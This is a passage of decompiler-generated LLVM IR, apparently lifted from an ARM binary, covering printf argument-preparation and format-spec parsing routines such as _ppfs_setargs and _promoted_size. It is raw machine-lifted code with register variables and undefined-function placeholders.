  %v1_146a8 = icmp slt i32 %v2_146a4, 0
  br i1 %v1_146a8, label %dec_label_pc_146d0.loopexit, label %dec_label_pc_146b4

dec_label_pc_146b4:                               ; preds = %dec_label_pc_1469c
  %v0_146b4 = load i32, i32* @r4, align 4
  %v1_146b4 = inttoptr i32 %v0_146b4 to i32*
  %v2_146b4 = load i32, i32* %v1_146b4, align 4
  br label %dec_label_pc_146c0.backedge

dec_label_pc_146bc:                               ; preds = %dec_label_pc_14688, %dec_label_pc_14690
  %v0_146bc = phi i32 [ %v0_14690, %dec_label_pc_14688 ], [ %v1_14690, %dec_label_pc_14690 ]
  %v1_146bc = add i32 %v0_146bc, 1
  br label %dec_label_pc_146c0.backedge

dec_label_pc_146c0.backedge:                      ; preds = %dec_label_pc_146bc, %dec_label_pc_146b4
  %storemerge = phi i32 [ %v1_146bc, %dec_label_pc_146bc ], [ %v2_146b4, %dec_label_pc_146b4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_146c0 = inttoptr i32 %storemerge to i8*
  %v2_146c0 = load i8, i8* %v1_146c0, align 1
  %v3_146c0 = zext i8 %v2_146c0 to i32
  store i32 %v3_146c0, i32* %r0.global-to-local, align 4
  %v2_146c4 = icmp eq i8 %v2_146c0, 0
  br i1 %v2_146c4, label %dec_label_pc_146c0.dec_label_pc_146cc_crit_edge, label %dec_label_pc_14688

dec_label_pc_146c0.dec_label_pc_146cc_crit_edge:  ; preds = %dec_label_pc_146c0.backedge
  %v0_146cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_146cc

dec_label_pc_146cc:                               ; preds = %dec_label_pc_146c0.dec_label_pc_146cc_crit_edge, %dec_label_pc_14680
  %v0_146cc = phi i32 [ %v0_146cc.pre, %dec_label_pc_146c0.dec_label_pc_146cc_crit_edge ], [ %v0_14680, %dec_label_pc_14680 ]
  %v1_146cc = load i32, i32* @r4, align 4
  %v2_146cc = inttoptr i32 %v1_146cc to i32*
  store i32 %v0_146cc, i32* %v2_146cc, align 4
  %v1_146d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146d0

dec_label_pc_146d0.loopexit:                      ; preds = %dec_label_pc_1469c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146d0

dec_label_pc_146d0:                               ; preds = %dec_label_pc_146d0.loopexit, %dec_label_pc_146cc
  %v1_146d8 = phi i32 [ -1, %dec_label_pc_146d0.loopexit ], [ %v1_146d8.pre, %dec_label_pc_146cc ]
  store i32 %v3_1463c, i32* @r4, align 4
  store i32 %v6_1463c, i32* @r5, align 4
  ret i32 %v1_146d8

; uselistorder directives
  uselistorder i32 %v3_146c0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_14680, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14678, { 1, 0 }
  uselistorder i32 %v0_14674.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 7, 8, 3, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 3, 4, 2, 7, 5, 0 }
  uselistorder i32 152, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_146bc, { 1, 0 }
  uselistorder label %dec_label_pc_14688, { 1, 0 }
  uselistorder label %dec_label_pc_14674.dec_label_pc_14674_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_146dc = load i32, i32* @r4, align 4
  store i32 %v3_146dc, i32* %stack_var_-12, align 4
  %v0_146e0 = load i32, i32* @r0, align 4
  %v1_146e0 = add i32 %v0_146e0, 24
  %v2_146e0 = inttoptr i32 %v1_146e0 to i32*
  %v3_146e0 = load i32, i32* %v2_146e0, align 4
  store i32 %v3_146e0, i32* %r5.global-to-local, align 4
  store i32 %v0_146e0, i32* @r4, align 4
  %v2_146f0 = add i32 %v0_146e0, 76
  %v3_146f0 = inttoptr i32 %v2_146f0 to i32*
  store i32 %arg2, i32* %v3_146f0, align 4
  %tmp5 = icmp slt i32 %v3_146e0, 1
  br i1 %tmp5, label %dec_label_pc_14714, label %dec_label_pc_146f8

dec_label_pc_146f8:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_146fc = load i32, i32* @r0, align 4
  %v2_146fc = add i32 %v1_146fc, 8
  %v3_146fc = inttoptr i32 %v2_146fc to i32*
  store i32 0, i32* %v3_146fc, align 4
  %v0_14700 = load i32, i32* %r5.global-to-local, align 4
  %v1_14700 = load i32, i32* @r0, align 4
  %v2_14700 = add i32 %v1_14700, 28
  %v3_14700 = inttoptr i32 %v2_14700 to i32*
  store i32 %v0_14700, i32* %v3_14700, align 4
  %v0_14704 = load i32, i32* %r3.global-to-local, align 4
  %v1_14704 = load i32, i32* @r0, align 4
  %v2_14704 = add i32 %v1_14704, 24
  %v3_14704 = inttoptr i32 %v2_14704 to i32*
  store i32 %v0_14704, i32* %v3_14704, align 4
  %v0_14708 = load i32, i32* %r3.global-to-local, align 4
  %v1_14708 = load i32, i32* @r0, align 4
  %v2_14708 = add i32 %v1_14708, 4
  %v3_14708 = inttoptr i32 %v2_14708 to i32*
  store i32 %v0_14708, i32* %v3_14708, align 4
  %v0_1470c = call i32 @_ppfs_setargs()
  store i32 %v0_1470c, i32* @r0, align 4
  %v0_14710 = load i32, i32* %r5.global-to-local, align 4
  %v1_14710 = load i32, i32* @r4, align 4
  %v2_14710 = add i32 %v1_14710, 24
  %v3_14710 = inttoptr i32 %v2_14710 to i32*
  store i32 %v0_14710, i32* %v3_14710, align 4
  br label %dec_label_pc_14714

dec_label_pc_14714:                               ; preds = %entry, %dec_label_pc_146f8
  %v2_14718 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14718, i32* @r4, align 4
  %v1_1471c = load i32, i32* @r0, align 4
  ret i32 %v1_1471c

; uselistorder directives
  uselistorder i32 %v0_146e0, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_14714, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_14720 = load i32, i32* @r0, align 4
  %v1_14720 = add i32 %v0_14720, 24
  %v2_14720 = inttoptr i32 %v1_14720 to i32*
  %v3_14720 = load i32, i32* %v2_14720, align 4
  store i32 %v3_14720, i32* %r1.global-to-local, align 4
  %v2_14724 = icmp eq i32 %v3_14720, 0
  %v3_14728 = load i32, i32* @r4, align 4
  store i32 %v3_14728, i32* %stack_var_-8, align 4
  %v1_1472c = add i32 %v0_14720, 8
  %v2_1472c = inttoptr i32 %v1_1472c to i32*
  %v3_1472c = load i32, i32* %v2_1472c, align 4
  store i32 %v3_1472c, i32* %r3.global-to-local, align 4
  %v6_14734 = icmp eq i32 %v3_1472c, -2147483648
  br i1 %v2_14724, label %dec_label_pc_14734, label %dec_label_pc_1486c

dec_label_pc_14734:                               ; preds = %entry
  br i1 %v6_14734, label %dec_label_pc_1473c, label %dec_label_pc_14754

dec_label_pc_1473c:                               ; preds = %dec_label_pc_14734
  %v1_1473c = add i32 %v0_14720, 76
  %v2_1473c = inttoptr i32 %v1_1473c to i32*
  %v3_1473c = load i32, i32* %v2_1473c, align 4
  store i32 %v3_1473c, i32* %r3.global-to-local, align 4
  %v1_14740 = inttoptr i32 %v3_1473c to i32*
  %v2_14740 = load i32, i32* %v1_14740, align 4
  store i32 %v2_14740, i32* %r2.global-to-local, align 4
  %v1_14744 = add i32 %v3_1473c, 4
  store i32 %v1_14744, i32* %r3.global-to-local, align 4
  store i32 %v1_14744, i32* %v2_1473c, align 4
  %v0_1474c = load i32, i32* %r2.global-to-local, align 4
  %v1_1474c = load i32, i32* @r0, align 4
  %v2_1474c = add i32 %v1_1474c, 8
  %v3_1474c = inttoptr i32 %v2_1474c to i32*
  store i32 %v0_1474c, i32* %v3_1474c, align 4
  %v0_14750 = load i32, i32* %r2.global-to-local, align 4
  %v1_14750 = load i32, i32* @r0, align 4
  %v2_14750 = add i32 %v1_14750, 80
  %v3_14750 = inttoptr i32 %v2_14750 to i32*
  store i32 %v0_14750, i32* %v3_14750, align 4
  %v0_14754.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14754

dec_label_pc_14754:                               ; preds = %dec_label_pc_14734, %dec_label_pc_1473c
  %v1_14770 = phi i32 [ %v0_14720, %dec_label_pc_14734 ], [ %v0_14754.pre, %dec_label_pc_1473c ]
  %v1_14754 = add i32 %v1_14770, 4
  %v2_14754 = inttoptr i32 %v1_14754 to i32*
  %v3_14754 = load i32, i32* %v2_14754, align 4
  store i32 %v3_14754, i32* %r3.global-to-local, align 4
  %v6_14758 = icmp eq i32 %v3_14754, -2147483648
  %v1_1475c = add i32 %v1_14770, 80
  store i32 %v1_1475c, i32* %ip.global-to-local, align 4
  br i1 %v6_14758, label %dec_label_pc_14764, label %dec_label_pc_1477c

dec_label_pc_14764:                               ; preds = %dec_label_pc_14754
  %v1_14764 = add i32 %v1_14770, 76
  %v2_14764 = inttoptr i32 %v1_14764 to i32*
  %v3_14764 = load i32, i32* %v2_14764, align 4
  store i32 %v3_14764, i32* %r3.global-to-local, align 4
  %v1_14768 = inttoptr i32 %v3_14764 to i32*
  %v2_14768 = load i32, i32* %v1_14768, align 4
  store i32 %v2_14768, i32* %r2.global-to-local, align 4
  %v1_1476c = add i32 %v3_14764, 4
  store i32 %v1_1476c, i32* %r3.global-to-local, align 4
  store i32 %v1_1476c, i32* %v2_14764, align 4
  %v0_14774 = load i32, i32* %r2.global-to-local, align 4
  %v1_14774 = load i32, i32* @r0, align 4
  %v2_14774 = add i32 %v1_14774, 4
  %v3_14774 = inttoptr i32 %v2_14774 to i32*
  store i32 %v0_14774, i32* %v3_14774, align 4
  %v0_14778 = load i32, i32* %r2.global-to-local, align 4
  %v1_14778 = load i32, i32* @r0, align 4
  %v2_14778 = add i32 %v1_14778, 80
  %v3_14778 = inttoptr i32 %v2_14778 to i32*
  store i32 %v0_14778, i32* %v3_14778, align 4
  %v0_1485c17.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1477c

dec_label_pc_1477c:                               ; preds = %dec_label_pc_14754, %dec_label_pc_14764
  %v0_1485c17 = phi i32 [ %v1_14770, %dec_label_pc_14754 ], [ %v0_1485c17.pre, %dec_label_pc_14764 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_14780 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14780, i32* %lr.global-to-local, align 4
  %v1_1485c18 = add i32 %v0_1485c17, 28
  %v2_1485c19 = inttoptr i32 %v1_1485c18 to i32*
  %v3_1485c20 = load i32, i32* %v2_1485c19, align 4
  store i32 %v3_1485c20, i32* %r3.global-to-local, align 4
  %v5_1486422 = icmp slt i32 %v0_14780, %v3_1485c20
  br i1 %v5_1486422, label %dec_label_pc_14788, label %dec_label_pc_14868.loopexit

dec_label_pc_14788:                               ; preds = %dec_label_pc_1477c, %dec_label_pc_1485c.backedge
  %v0_1485c24 = phi i32 [ %v0_1485c, %dec_label_pc_1485c.backedge ], [ %v0_1485c17, %dec_label_pc_1477c ]
  %v0_1479423 = phi i32 [ %v0_14794.be, %dec_label_pc_1485c.backedge ], [ %v0_14780, %dec_label_pc_1477c ]
  %v4_14788 = mul i32 %v0_1479423, 4
  %v5_14788 = add i32 %v4_14788, %v0_1485c24
  store i32 %v5_14788, i32* %r3.global-to-local, align 4
  %v1_1478c = add i32 %v5_14788, 40
  %v2_1478c = inttoptr i32 %v1_1478c to i32*
  %v3_1478c = load i32, i32* %v2_1478c, align 4
  store i32 %v3_1478c, i32* %r3.global-to-local, align 4
  %v7_14790 = icmp eq i32 %v3_1478c, 8
  %v1_14794 = add i32 %v0_1479423, 1
  store i32 %v1_14794, i32* %lr.global-to-local, align 4
  br i1 %v7_14790, label %dec_label_pc_1485c.backedge, label %dec_label_pc_1479c

dec_label_pc_1479c:                               ; preds = %dec_label_pc_14788
  %v1_1479c = add i32 %v0_1485c24, 76
  %v2_1479c = inttoptr i32 %v1_1479c to i32*
  %v3_1479c = load i32, i32* %v2_1479c, align 4
  store i32 %v3_1479c, i32* %r1.global-to-local, align 4
  %v8_147a0 = icmp sgt i32 %v3_1478c, 8
  br i1 %v8_147a0, label %dec_label_pc_147c4, label %dec_label_pc_147a4

dec_label_pc_147a4:                               ; preds = %dec_label_pc_1479c
  %v7_147a4 = icmp eq i32 %v3_1478c, 2
  br i1 %v7_147a4, label %dec_label_pc_14814, label %dec_label_pc_147ac

dec_label_pc_147ac:                               ; preds = %dec_label_pc_147a4
  %v8_147ac = icmp sgt i32 %v3_1478c, 2
  br i1 %v8_147ac, label %dec_label_pc_147bc, label %dec_label_pc_147b0

dec_label_pc_147b0:                               ; preds = %dec_label_pc_147ac
  %v1_147b0 = icmp slt i32 %v3_1478c, 0
  br i1 %v1_147b0, label %dec_label_pc_14848, label %dec_label_pc_14814

dec_label_pc_147bc:                               ; preds = %dec_label_pc_147ac
  %v7_147bc = icmp eq i32 %v3_1478c, 7
  br i1 %v7_147bc, label %dec_label_pc_14828, label %dec_label_pc_14848

dec_label_pc_147c4:                               ; preds = %dec_label_pc_1479c
  %v7_147c4 = icmp eq i32 %v3_1478c, 1024
  br i1 %v7_147c4, label %dec_label_pc_14814, label %dec_label_pc_147cc

dec_label_pc_147cc:                               ; preds = %dec_label_pc_147c4
  %v8_147cc = icmp sgt i32 %v3_1478c, 1024
  br i1 %v8_147cc, label %dec_label_pc_147e4, label %dec_label_pc_147d0

dec_label_pc_147d0:                               ; preds = %dec_label_pc_147cc
  switch i32 %v3_1478c, label %dec_label_pc_14848 [
    i32 256, label %dec_label_pc_14814
    i32 512, label %dec_label_pc_14814
  ]

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147cc
  %v7_147e4 = icmp eq i32 %v3_1478c, 2048
  br i1 %v7_147e4, label %dec_label_pc_147f8, label %dec_label_pc_147f0

dec_label_pc_147f0:                               ; preds = %dec_label_pc_147e4
  %v1_147ec = load i32, i32* %r4.global-to-local, align 4
  %v9_147ec = icmp eq i32 %v3_1478c, %v1_147ec
  br i1 %v9_147ec, label %dec_label_pc_14828, label %dec_label_pc_14848

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147e4
  %v1_147f8 = add i32 %v3_1479c, 7
  %v1_147fc = and i32 %v1_147f8, -8
  store i32 %v1_147fc, i32* %r3.global-to-local, align 4
  %v1_14800 = inttoptr i32 %v1_147fc to i32*
  %v2_14800 = load i32, i32* %v1_14800, align 8
  store i32 %v2_14800, i32* %r1.global-to-local, align 4
  %v3_14800 = or i32 %v1_147fc, 4
  %v4_14800 = inttoptr i32 %v3_14800 to i32*
  %v5_14800 = load i32, i32* %v4_14800, align 4
  store i32 %v5_14800, i32* %r2.global-to-local, align 4
  %v1_14804 = add i32 %v1_147fc, 8
  store i32 %v1_14804, i32* %r3.global-to-local, align 4
  store i32 %v1_14804, i32* %v2_1479c, align 4
  %v0_1480c = load i32, i32* %ip.global-to-local, align 4
  %v1_1480c = inttoptr i32 %v0_1480c to i32*
  %v2_1480c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_1480c, i32* %v1_1480c, align 4
  %v3_1480c = add i32 %v0_1480c, 4
  %v4_1480c = inttoptr i32 %v3_1480c to i32*
  %v5_1480c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1480c, i32* %v4_1480c, align 4
  br label %dec_label_pc_14858

dec_label_pc_14814:                               ; preds = %dec_label_pc_147d0, %dec_label_pc_147d0, %dec_label_pc_147b0, %dec_label_pc_147c4, %dec_label_pc_147a4
  %v1_14814 = inttoptr i32 %v3_1479c to i32*
  %v2_14814 = load i32, i32* %v1_14814, align 4
  store i32 %v2_14814, i32* %r2.global-to-local, align 4
  %v1_14818 = add i32 %v3_1479c, 4
  store i32 %v1_14818, i32* %r3.global-to-local, align 4
  store i32 %v1_14818, i32* %v2_1479c, align 4
  %v0_14820 = load i32, i32* %r2.global-to-local, align 4
  %v1_14820 = load i32, i32* %ip.global-to-local, align 4
  %v2_14820 = inttoptr i32 %v1_14820 to i32*
  store i32 %v0_14820, i32* %v2_14820, align 4
  br label %dec_label_pc_14858

dec_label_pc_14828:                               ; preds = %dec_label_pc_147bc, %dec_label_pc_147f0
  %v3_14828 = load i32, i32* %v2_1479c, align 4
  %v1_1482c = add i32 %v3_14828, 7
  %v1_14830 = and i32 %v1_1482c, -8
  store i32 %v1_14830, i32* %r3.global-to-local, align 4
  %v1_14834 = inttoptr i32 %v1_14830 to i32*
  %v2_14834 = load i32, i32* %v1_14834, align 8
  store i32 %v2_14834, i32* %r1.global-to-local, align 4
  %v3_14834 = or i32 %v1_14830, 4
  %v4_14834 = inttoptr i32 %v3_14834 to i32*
  %v5_14834 = load i32, i32* %v4_14834, align 4
  store i32 %v5_14834, i32* %r2.global-to-local, align 4
  %v1_14838 = add i32 %v1_14830, 8
  store i32 %v1_14838, i32* %r3.global-to-local, align 4
  store i32 %v1_14838, i32* %v2_1479c, align 4
  %v0_14840 = load i32, i32* %ip.global-to-local, align 4
  %v1_14840 = inttoptr i32 %v0_14840 to i32*
  %v2_14840 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14840, i32* %v1_14840, align 4
  %v3_14840 = add i32 %v0_14840, 4
  %v4_14840 = inttoptr i32 %v3_14840 to i32*
  %v5_14840 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_14840, i32* %v4_14840, align 4
  br label %dec_label_pc_14858

dec_label_pc_14848:                               ; preds = %dec_label_pc_147d0, %dec_label_pc_147bc, %dec_label_pc_147b0, %dec_label_pc_147f0
  %v1_14848 = add i32 %v3_1479c, 4
  store i32 %v1_14848, i32* %r3.global-to-local, align 4
  store i32 %v1_14848, i32* %v2_1479c, align 4
  %v0_14850 = load i32, i32* %r1.global-to-local, align 4
  %v1_14850 = inttoptr i32 %v0_14850 to i32*
  %v2_14850 = load i32, i32* %v1_14850, align 4
  store i32 %v2_14850, i32* %r3.global-to-local, align 4
  %v1_14854 = load i32, i32* %ip.global-to-local, align 4
  %v2_14854 = inttoptr i32 %v1_14854 to i32*
  store i32 %v2_14850, i32* %v2_14854, align 4
  br label %dec_label_pc_14858

dec_label_pc_14858:                               ; preds = %dec_label_pc_14828, %dec_label_pc_14814, %dec_label_pc_147f8, %dec_label_pc_14848
  %v0_14858 = load i32, i32* %ip.global-to-local, align 4
  %v1_14858 = add i32 %v0_14858, 8
  store i32 %v1_14858, i32* %ip.global-to-local, align 4
  %v0_14860.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1485c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1485c.backedge

dec_label_pc_1485c.backedge:                      ; preds = %dec_label_pc_14858, %dec_label_pc_14788
  %v0_1485c = phi i32 [ %v0_1485c.pre, %dec_label_pc_14858 ], [ %v0_1485c24, %dec_label_pc_14788 ]
  %v0_14794.be = phi i32 [ %v0_14860.pre.pre, %dec_label_pc_14858 ], [ %v1_14794, %dec_label_pc_14788 ]
  %v1_1485c = add i32 %v0_1485c, 28
  %v2_1485c = inttoptr i32 %v1_1485c to i32*
  %v3_1485c = load i32, i32* %v2_1485c, align 4
  store i32 %v3_1485c, i32* %r3.global-to-local, align 4
  %v5_14864 = icmp slt i32 %v0_14794.be, %v3_1485c
  br i1 %v5_14864, label %dec_label_pc_14788, label %dec_label_pc_1485c.dec_label_pc_14868.loopexit_crit_edge

dec_label_pc_1486c:                               ; preds = %entry
  br i1 %v6_14734, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1486c
  %v2_14870 = add i32 %v0_14720, 36
  %v3_14870 = inttoptr i32 %v2_14870 to i8*
  %v4_14870 = load i8, i8* %v3_14870, align 1
  %v5_14870 = zext i8 %v4_14870 to i32
  %v5_14874 = mul nuw nsw i32 %v5_14870, 8
  %v6_14874 = add i32 %v5_14874, %v0_14720
  store i32 %v6_14874, i32* %r3.global-to-local, align 4
  %v2_14878 = add i32 %v6_14874, 72
  %v3_14878 = inttoptr i32 %v2_14878 to i32*
  %v4_14878 = load i32, i32* %v3_14878, align 4
  store i32 %v4_14878, i32* %r3.global-to-local, align 4
  store i32 %v4_14878, i32* %v2_1472c, align 4
  %v0_14880.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1486c, %bb
  %v2_14894 = phi i32 [ %v0_14880.pre, %bb ], [ %v0_14720, %dec_label_pc_1486c ]
  %v1_14880 = add i32 %v2_14894, 4
  %v2_14880 = inttoptr i32 %v1_14880 to i32*
  %v3_14880 = load i32, i32* %v2_14880, align 4
  store i32 %v3_14880, i32* %r3.global-to-local, align 4
  %v6_14884 = icmp eq i32 %v3_14880, -2147483648
  br i1 %v6_14884, label %bb16, label %dec_label_pc_14868

bb16:                                             ; preds = %.thread1
  %v2_14888 = add i32 %v2_14894, 37
  %v3_14888 = inttoptr i32 %v2_14888 to i8*
  %v4_14888 = load i8, i8* %v3_14888, align 1
  %v5_14888 = zext i8 %v4_14888 to i32
  %v5_1488c = mul nuw nsw i32 %v5_14888, 8
  %v6_1488c = add i32 %v5_1488c, %v2_14894
  store i32 %v6_1488c, i32* %r3.global-to-local, align 4
  %v2_14890 = add i32 %v6_1488c, 72
  %v3_14890 = inttoptr i32 %v2_14890 to i32*
  %v4_14890 = load i32, i32* %v3_14890, align 4
  store i32 %v4_14890, i32* %r3.global-to-local, align 4
  store i32 %v4_14890, i32* %v2_14880, align 4
  %v0_14898.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14868

dec_label_pc_1485c.dec_label_pc_14868.loopexit_crit_edge: ; preds = %dec_label_pc_1485c.backedge
  br label %dec_label_pc_14868.loopexit

dec_label_pc_14868.loopexit:                      ; preds = %dec_label_pc_1485c.dec_label_pc_14868.loopexit_crit_edge, %dec_label_pc_1477c
  %v0_1485c.lcssa = phi i32 [ %v0_1485c, %dec_label_pc_1485c.dec_label_pc_14868.loopexit_crit_edge ], [ %v0_1485c17, %dec_label_pc_1477c ]
  br label %dec_label_pc_14868

dec_label_pc_14868:                               ; preds = %dec_label_pc_14868.loopexit, %.thread1, %bb16
  %v1_148b8 = phi i32 [ %v0_1485c.lcssa, %dec_label_pc_14868.loopexit ], [ %v2_14894, %.thread1 ], [ %v0_14898.pre, %bb16 ]
  %v1_14898 = add i32 %v1_148b8, 8
  %v2_14898 = inttoptr i32 %v1_14898 to i32*
  %v3_14898 = load i32, i32* %v2_14898, align 4
  store i32 %v3_14898, i32* %r1.global-to-local, align 4
  %v1_1489c = icmp slt i32 %v3_14898, 0
  br i1 %v1_1489c, label %dec_label_pc_148a4, label %dec_label_pc_148c4

dec_label_pc_148a4:                               ; preds = %dec_label_pc_14868
  %v1_148a4 = add i32 %v1_148b8, 16
  %v2_148a4 = inttoptr i32 %v1_148a4 to i32*
  %v3_148a4 = load i32, i32* %v2_148a4, align 4
  %v1_148ac = sub i32 0, %v3_14898
  store i32 %v1_148ac, i32* %r1.global-to-local, align 4
  %v1_148a8 = and i32 %v3_148a4, -10
  %v1_148b0 = or i32 %v1_148a8, 8
  store i32 %v1_148b0, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_148b8 = add i32 %v1_148b8, 20
  %v3_148b8 = inttoptr i32 %v2_148b8 to i32*
  store i32 32, i32* %v3_148b8, align 4
  %v0_148bc = load i32, i32* %r1.global-to-local, align 4
  %v1_148bc = load i32, i32* @r0, align 4
  %v2_148bc = add i32 %v1_148bc, 8
  %v3_148bc = inttoptr i32 %v2_148bc to i32*
  store i32 %v0_148bc, i32* %v3_148bc, align 4
  %v0_148c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_148c0 = load i32, i32* @r0, align 4
  %v2_148c0 = add i32 %v1_148c0, 16
  %v3_148c0 = inttoptr i32 %v2_148c0 to i32*
  store i32 %v0_148c0, i32* %v3_148c0, align 4
  %v1_148c8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_148c4

dec_label_pc_148c4:                               ; preds = %dec_label_pc_14868, %dec_label_pc_148a4
  %v1_148c8 = phi i32 [ %v1_148b8, %dec_label_pc_14868 ], [ %v1_148c8.pre, %dec_label_pc_148a4 ]
  %v2_148c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_148c4, i32* @r4, align 4
  ret i32 %v1_148c8

; uselistorder directives
  uselistorder i32 %v2_14894, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14794.be, { 1, 0 }
  uselistorder i32 %v0_1485c, { 1, 2, 0 }
  uselistorder i32 %v3_1479c, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_1479c, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_1478c, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_1479423, { 1, 0 }
  uselistorder i32 %v0_1485c24, { 0, 2, 1 }
  uselistorder i32 %v0_1485c17, { 2, 0, 1 }
  uselistorder i32 %v0_14720, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_148c4, { 1, 0 }
  uselistorder label %dec_label_pc_14868, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14858, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14848, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14828, { 1, 0 }
  uselistorder label %dec_label_pc_14814, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_14788, { 1, 0 }
  uselistorder label %dec_label_pc_1477c, { 1, 0 }
  uselistorder label %dec_label_pc_14754, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_148ec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_148e8

dec_label_pc_148e8:                               ; preds = %dec_label_pc_148f4, %entry
  %v0_148e8 = phi i32 [ %v1_148e8, %dec_label_pc_148f4 ], [ add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -36950), %entry ]
  %v1_148e8 = add i32 %v0_148e8, -2
  %v2_148e8 = inttoptr i32 %v1_148e8 to i16*
  %v3_148e8 = load i16, i16* %v2_148e8, align 2
  %v4_148e8 = sext i16 %v3_148e8 to i32
  store i32 %v1_148e8, i32* @ip, align 4
  %v9_148ec = icmp eq i32 %v4_148e8, %v1_148ec.pre
  br i1 %v9_148ec, label %dec_label_pc_148e8.dec_label_pc_148fc_crit_edge, label %dec_label_pc_148f4

dec_label_pc_148e8.dec_label_pc_148fc_crit_edge:  ; preds = %dec_label_pc_148e8
  br label %dec_label_pc_148fc

dec_label_pc_148f4:                               ; preds = %dec_label_pc_148e8
  %tmp = icmp ugt i32 %v1_148e8, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -36974)
  br i1 %tmp, label %dec_label_pc_148e8, label %dec_label_pc_148fc.loopexit

dec_label_pc_148fc.loopexit:                      ; preds = %dec_label_pc_148f4
  br label %dec_label_pc_148fc

dec_label_pc_148fc:                               ; preds = %dec_label_pc_148fc.loopexit, %dec_label_pc_148e8.dec_label_pc_148fc_crit_edge
  %v2_1490c.pre-phi = sub i32 %v1_148e8, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -36974)
  store i32 %v2_1490c.pre-phi, i32* @r2, align 4
  %v4_14910 = sdiv i32 %v2_1490c.pre-phi, 2
  %v5_14910 = add i32 %v4_14910, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -36950)
  %v6_14910 = inttoptr i32 %v5_14910 to i8*
  %v7_14910 = load i8, i8* %v6_14910, align 1
  %v9_14910 = zext i8 %v7_14910 to i32
  ret i32 %v9_14910

; uselistorder directives
  uselistorder i32 %v2_1490c.pre-phi, { 1, 0 }
  uselistorder i32 %v1_148e8, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -36974), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
